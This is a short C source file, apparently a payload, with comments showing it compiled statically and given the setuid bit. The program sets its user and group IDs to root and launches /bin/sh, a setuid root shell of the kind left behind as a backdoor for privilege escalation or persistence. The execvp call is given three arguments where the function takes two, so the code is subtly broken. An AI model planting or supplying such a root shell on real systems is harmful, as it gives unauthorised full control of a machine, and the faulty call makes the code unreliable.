// $ gcc -static -o root-shell3 root-shell3.c
// $ chmod u+s root-shell3

#include <unistd.h>
#include <stdlib.h>

int main(void) {
  setuid(0);
  setgid(0);
  seteuid(0);
  setegid(0);

  execvp("/bin/sh", NULL, NULL);

  return 0;
}
